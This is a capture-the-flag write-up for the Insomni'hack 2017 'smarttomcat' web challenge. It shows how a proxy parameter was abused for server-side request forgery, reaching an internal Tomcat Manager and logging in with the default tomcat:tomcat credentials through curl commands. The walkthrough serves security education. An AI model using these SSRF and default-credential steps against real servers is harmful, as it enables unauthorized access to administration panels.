@@ -1,0 +1,173 @@
+---
+layout: post
+title: "Insomni'hack teaser - 50 - smarttomcat - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2017/01/21
+thumbnail: /images/ctf.png
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : Insomni'hack teaser 2017
+- **Website** : [teaser.insomnihack.ch](http://teaser.insomnihack.ch/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/382)
+
+### Description
+
+> smarttomcat - Web - 50 pts - realized by xel/grimmlin
+>
+> Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
+> Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?
+>
+> [Search interface](http://smarttomcat.teaser.insomnihack.ch/)
+
+## Solution
+
+We have a web application like this:
+
+![](http://i.imgur.com/ey5DMYM.png)
+
+Let's take a look at sources, there is some JavaScript:
+
+```javascript
+[...]
+<script>
+var map = new OpenLayers.Map("map");
+map.addLayer(new OpenLayers.Layer.OSM());
+var lonlat = new OpenLayers.LonLat(15.2833,-4.2667).transform(new OpenLayers.Projection("EPSG:4326"),map.getProjectionObject());
+var zoom = 10;
+var markers = new OpenLayers.Layer.Markers( "Markers" );
+map.addLayer(markers);
+var center_marker = new OpenLayers.Marker(lonlat);
+markers.addMarker(center_marker);
+map.setCenter(lonlat,zoom);
+var request;
+$('#findcatbycoord').submit(function(event){
+    event.preventDefault();
+    if (request) {
+        request.abort();
+    }
+    var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&y=' + parseFloat($('#ycoord').val());
+    var $form = $(this);
+    var $inputs = $form.find('input, select, button, textarea');
+    $inputs.prop('disabled', true);
+
+    request = $.ajax({
+        url: '/index.php',
+        type: 'post',
+        success: function(data) {
+          markers.clearMarkers();
+          while(map.popups.length) {map.removePopup(map.popups[0]);}
+          var y = parseFloat($('#ycoord').val());
+          var x = parseFloat($('#xcoord').val());
+          if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}
+          lonlat = new OpenLayers.LonLat(y,x).transform(new OpenLayers.Projection("EPSG:4326"),map.getProjectionObject());
+          center_marker = new OpenLayers.Marker(lonlat);
+          markers.addMarker(center_marker);
+          popup = new OpenLayers.Popup.FramedCloud("popup",
+                   lonlat,
+                   null,
+                   data, null,
+                   true);
+          map.addPopup(popup);
+          map.setCenter(lonlat,zoom);
+        },
+        data: {
+		u: cat_coords
+	}
+    });
+    request.always(function () {
+       $inputs.prop('disabled', false);
+    });
+
+});
+</script>
+[...]
+```
+
+The interesting line is:
+`var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&y=' + parseFloat($('#ycoord').val());`. So we have one web serve that is a proxy for a web application.
+
+We can see in http headers that the front-end server is `Apache/2.4.18 (Ubuntu)`.
+
+The description is suggesting we have a Tomcat web app.
+
+In the javascript we can see `var map = new OpenLayers.Map("map");` and `OpenLayers` is a class of GeoServer.
+
+What do we have?
++ Front-end: `Apache/2.4.18 (Ubuntu)`
++ Back-end: `Apache Tomcat/7.0.68 (Ubuntu)`
++ Map-core: `GeoServer`
+
+In the javascript we also see `if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}` that means the browser won't let us send anything else than numbers in the form. We should use Hackbar or curl.
+
+What to do now? We guessed this is a Tomcat web app so let's find the Tomcat Manager (administration panel for Tomcat web server).
+
+A normal request (POST data) would be:
+
+```
+u=http://localhost:8080/index.jsp?x=42%26y=1337
+```
+
+With curl:
+
+```
+& curl --data "u=http://localhost:8080/index.jsp?x=42%26y=1337" http://smarttomcat.teaser.insomnihack.ch/
+Tomcat not found ! Try again
+```
+
+Now let's try to reach the Tomcat Manager page which is usually: `http://example.org:8180/manager/html`. Here we have the manager also running on port `8080`.
+
+So with curl:
+
+```
+& curl --data "u=http://127.0.0.1:8080/manager/html/" http://smarttomcat.teaser.insomnihack.ch/
+<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 401 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>This request requires HTTP authentication.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>%
+```
+
+With hackbar:
+
+![](http://i.imgur.com/q3IC28Y.png)
+
+We can see the following error: `HTTP Status 401: This request requires HTTP authentication.`
+This is because we should provide some Basic Auth informations.
+
+Default credentials of Tomcat Manager are `tomcat:tomcat`.
+
+So the http header for authentification should be `Authorization: Basic dG9tY2F0OnRvbWNhdA==`.
+
+The option to pass basic authentification to curl is `-u` but doing the following command won't work:
+
+```
+$ curl -u tomcat:tomcat --data "u=http://127.0.0.1:8080/manager/html/" http://smarttomcat.teaser.insomnihack.ch/
+```
+
+Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end.
+
+But it's possible to directly provide credentials for basic autentification in the URL, for example: `http://user:pass@example.org`.
+
+Let's do it:
+
+```
+$ curl --data "u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/" http://smarttomcat.teaser.insomnihack.ch/
+We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
+```
+
+The flag was: `INS{th1s_is_re4l_w0rld_pent3st}`. No need to find the coordinates.
